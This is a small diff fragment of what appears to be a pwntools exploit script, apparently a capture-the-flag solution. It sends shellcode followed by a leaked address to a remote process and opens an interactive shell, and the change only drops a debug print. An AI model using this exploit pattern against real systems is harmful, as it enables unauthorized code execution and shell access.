@@ -11,8 +11,6 @@ address = r.recv()
 print("address: " + address)
 
 shellcode += p64(int(address.decode(),16))
-print(shellcode)
 
 r.send(shellcode)
 r.interactive()
-
